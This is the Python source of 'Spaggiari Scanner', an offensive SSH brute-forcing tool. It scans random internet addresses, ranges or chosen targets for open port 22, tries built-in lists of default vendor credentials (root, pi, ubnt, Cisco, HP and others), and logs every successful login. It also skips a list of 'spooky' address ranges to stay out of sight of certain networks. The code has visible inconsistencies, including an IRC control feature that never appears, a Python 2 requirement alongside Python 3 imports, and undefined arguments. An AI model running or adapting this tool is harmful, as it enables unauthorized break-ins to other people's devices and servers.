#!/usr/bin/env python
# Spaggiari Scanner
# A Secure Shell (SSH) scanner / bruteforcer that can be controlled via the Internet Relay Chat (IRC) protocol.
# Developed by acidvegas in Python 2 & 3
# https://github.com/acidvegas/spaggiari/
# spaggiari.py

"""
ISC License

Copyright (c) 2016, acidvegas (https://github.com/acidvegas/)

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
"""

"""
'sans armes, ni haine, ni violence'

Requirments:
 - Paramiko Library (http://www.paramiko.org/)
 
Usage: spaggiari.py [OPTIONS] [SCAN]
    OPTIONS
        -d                 | enable deep scanning.
        -o <path>          | save output from scan(s) to file.
    SCAN
        -l <path>          | scan a list of ip addresses from file.
        -x                 | scan random ip addresses.
        -r <class> <range> | scan a range of ip addresses.
        -t <ip>            | scan a target ip address.

    Deep scanning uses a larger list of combos to bruteforce with.
    The <class> can be b or c. The <range> is the ip address range prefix to scan.
    Example: spaggiari -r b 192.168   (Scans the range 192.168.0.0-192.168.255.255)
    Example: spaggiari -r c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
"""

import argparse
import logging
import os
import random
import re
import socket
import sys
import threading
import time
import urllib.request
from collections import OrderedDict

# Throttle Settings
max_threads     = 100
throttle        = 20
timeout_breaker = 5
timeout_port    = 1
timeout_ssh     = 10.0

# SSH Login Combos
combos = OrderedDict([
    ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
])

deep_combos = OrderedDict([
    ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
    ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
    ('alien',     'alien'),
    ('bitnami',   'bitnami'),
    ('cisco',     'cisco'),
    ('device',    'apc'),
    ('dpn',       'changeme'),
    ('HPSupport', 'badg3r5'),
    ('lp',        'lp'),
    ('master',    'themaster01'),
    ('osmc',      'osmc'),
    ('pi',        'raspberry'),
    ('plexuser',  'rasplex'),
    ('sysadmin',  'PASS'),
    ('toor',      'logapp'),
    ('ubnt',      'ubnt'),
    ('user',      ('acme','live')),
    ('vagrant',   'vagrant'),
    ('virl',      'VIRL'),
    ('vyos',      'vyos')
])

# Important Ranges (DO NOT EDIT)
spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')

def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_port)
    try:
        code = sock.connect((ip, port))
    except socket.error:
        return False
    else:
        if not code  : return True
        else         : return False
    finally:
        sock.close()

def check_range(targets):
    found   = False
    for ip in targets:
        if found : break
        for bad_range in spooky + reserved:
            if ip.startswith(bad_range + '.'):
                found = True
                break
    return found

def ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split('.')))
    end   = list(map(int, end_ip.split('.')))
    temp  = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
           if temp[i] == 256:
              temp[i] = 0
              temp[i-1] += 1
        ip_range.append('.'.join(map(str, temp)))
    random.shuffle(ip_range)
    return ip_range

def random_int(min, max):
    return random.randint(min, max)

def random_ip():
    return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))

def random_scan():
    while True:
        ip = (random_ip(),)
        if not check_range(ip):
            threading.Thread(target=ssh_bruteforce, args=(ip)).start()
        while threading.activeCount() >= max_threads:
            time.sleep(1)

def range_scan(ip_range):
    for ip in ip_range:
        threading.Thread(target=ssh_bruteforce, args=(ip)).start()
        ip_range.remove(ip)
        while threading.activeCount() >= max_threads:
            time.sleep(1)
    while threading.activeCount() >= 2:
        time.sleep(1)

def ssh_bruteforce(ip):
    timeouts = 0
    if check_port(ip, 22):
        logging.debug('%s has port 22 open.', ip)
        for user in combos.keys():
            if timeouts >= timeout_breaker:
                break
            else:
                password = combos[user]
                if type(password) == tuple:
                    for item in password:
                        if timeouts >= timeout_breaker:
                            break
                        else:
                            result = ssh_connect(ip, user, item)
                            if   result == 1 : timeouts += 1
                            elif result == 2 : timeouts = timeout_breaker
                            time.sleep(throttle)
                else:
                    result = ssh_connect(ip, user, password)
                    if   result == 1 : timeouts += 1
                    elif result == 2 : timeouts = timeout_breaker
                    time.sleep(throttle)
    else:
        logging.error('%s does not have port 22 open.', ip)

def ssh_connect(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
    except socket.timeout:
        logging.error('Failed to connect to %s using %s:%s (Timeout)', hostname, username, password)
        return 1
    except Exception as ex:
        logging.error('Failed to connect to %s using %s:%s (%s)', hostname, username, password, ex)
        return 0
    else:
        logging.info('Successful connection to %s using %s:%s', hostname, username, password)
        return 2
    finally:
        ssh.close()

# Main
print(''.rjust(56, '#'))
print('#' + ''.center(54) + '#')
print('#' + 'Spaggiari Scanner'.center(54) + '#')
print('#' + 'Developed by acidvegas in Python 2 & 3'.center(54) + '#')
print('#' + 'https://github.com/acidvegas/spaggiari/'.center(54) + '#')
print('#' + ''.center(54) + '#')
print(''.rjust(56, '#'))
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s | %(levelname)8s: %(message)s', '%I:%M:%S')
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)
if not sys.version_info.major == 2:
    logging.critical('Spaggiari Scanner requires Python version 2 to run!')
    sys.exit()
try:
    import paramiko
except ImportError:
    logging.critical('Failed to import the Paramiko library!')
    sys.exit()
else:
    paramiko.util.log_to_file('/dev/null')
parser = argparse.ArgumentParser(prog='spaggiari.py', usage='%(prog)s [OPTIONS] [SCAN]')
parser.add_argument('-d', action='store_true', dest='deepscan', help='option: enable deep scanning.')
parser.add_argument('-o', dest='output', help='option: save output from scan(s) to file.', metavar='<path>', type=str)
parser.add_argument('-l', dest='listscan', help='scan a list of ip addresses from file.', metavar='<path>', type=str)
parser.add_argument('-x', action='store_true', dest='randscan', help='scan random ip addresses.')
parser.add_argument('-r', dest='rangescan', help='scan a range of ip addresses.', metavar=('<class>', '<range>'), nargs=2, type=str)
parser.add_argument('-t', dest='targetscan', help='scan a target ip address.', metavar='<ip>', type=str)
args = parser.parse_args()
if args.deepscan:
    combos = combos + deep_combos
if args.output:
    file_handler = logging.FileHandler(args.output)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    logger.debug('Logging enabled.')
if args.listscan:
    if os.path.isfile(args.listscan):
        targets = []
        with open(args.listscan) as list_file:
            lines = list_file.read().splitlines()
            for line in [x for x in lines if x]:
                if check_ip(line):
                    targets.append(line)
        if targets:
            if not check_range(targets):
                logging.debug('Scanning %s IP addresses from list...', '{:,}'.format(len(targets)))
                range_scan(targets)
                logging.debug('Scan has completed.')
            else:
                logging.error('Spooky/Reserved IP address in range.')
        else:
            logging.error('List contains no valid IP addresses.')
    else:
        logging.error('Invalid list file. (%s)', args.listscan)
elif args.randscan:
    logging.debug('Scanning random IP addresses...')
    random_scan()
elif args.rangescan:
    if args.rangescan[0] in ('b','c'):
        if args.rangescan[0] == 'b':
            if args.iprange == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
            else                        : range_prefix = args.rangescan[1]
            start = range_prefix + '.0.0'
            end   = range_prefix + '.255.255'
        elif args.rangescan[0] == 'c':
            if args.iprange == 'random' : range_prefix = '%d.%d.%d' % (random_int(0,255), random_int(0,255), random_int(0,255))
            else                        : range_prefix = args.rangescan[1]
            start = range_prefix + '.0'
            end   = range_prefix + '.255'
        if check_ip(start):
            targets = ip_range(start, end)
            if not check_range(targets):
                logging.debug('Scanning %s IP addresses in range...', '{:,}'.format(len(targets)))
                range_scan(targets)
                logging.debug('Scan has completed.')
            else:
                logging.error('Spooky/Reserved IP address in range.')
        else:
            logging.error('Invalid IP range prefix. (%s)', args.rangescan[1])
    else:
        logging.error('Invalid IP Class. (%s)', args.rangescan[0])
elif args.targetscan:
    if check_ip(args.targetscan):
        ssh_bruteforce(args.targetscan)
        logging.debug('Scan has completed.')
    else:
        logging.error('Invalid IP Address. (%)', args.targetscan)
else:
    parser.print_help()
